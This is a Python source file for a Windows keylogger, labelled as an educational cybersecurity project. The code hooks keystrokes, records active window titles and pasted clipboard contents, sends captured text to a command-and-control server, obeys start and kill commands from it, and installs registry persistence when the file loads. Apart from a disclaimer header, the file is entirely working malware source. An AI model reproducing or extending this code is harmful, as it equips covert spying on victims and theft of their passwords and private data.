###########################################################################################
#### author: NC
#### date: 08/08/2025
#### Python version: 3.8
####
#### ⚠️ DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################



# keylogger.py
# Python version: py -3.8
# Educational Purpose only !!!

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import c2_client
import persistence
import os
import pyWinhook as pyHook
import sys
import pythoncom
import win32clipboard
import time


AppData = os.path.expandvars(r"%APPDATA%")
persistence.registry_modification(r"educational_keylogger.exe", AppData)



class keylogger:

    def __init__(self):
        self.current_window = None
        self.buffer = ""



    def get_process(self):
        active_window = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(active_window, byref(pid))
        process_id = f'{pid.value}'



        executable = create_string_buffer(512)
        handle_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(handle_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(active_window, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()

        except UnicodeDecodeError as e:
            print(e)

        windll.kernel32.CloseHandle(active_window)
        windll.kernel32.CloseHandle(handle_process)



    def keystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_process()

        elif event.Key == "V" and (event.Control or event.ControlKey):
            win32clipboard.OpenClipboard()
            value_clipboard = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            self.buffer += f'[PASTE: {value_clipboard}]'

        elif 32 < event.Ascii < 127:
            self.buffer += chr(event.Ascii)

        else:
            self.buffer += f'[{event.Key}]'

        if event.Key == "Return" and self.buffer.strip():
            c2_client.send_to_c2_server(self.buffer)
            self.buffer = ""

        return True



def start():
    command = c2_client.receive_from_c2_server()

    if command == "start":
        c2_client.send_to_c2_server("[!] Keylogger activated.")
            
        try:
            save_stdout = sys.stdout
            sys.stdout = StringIO()
            kl = keylogger()
            hm = pyHook.HookManager()
            hm.KeyDown = kl.keystroke
            hm.HookKeyboard()
            pythoncom.PumpMessages()

        except Exception as e:
            c2_client.send_to_c2_server(str(e))

        finally:
            sys.stdout = save_stdout

    elif command == "kill":
        c2_client.send_to_c2_server("[!] Keylogger killed.")
        time.sleep(2)
        sys.exit()




if __name__ == "__main__":
    start()




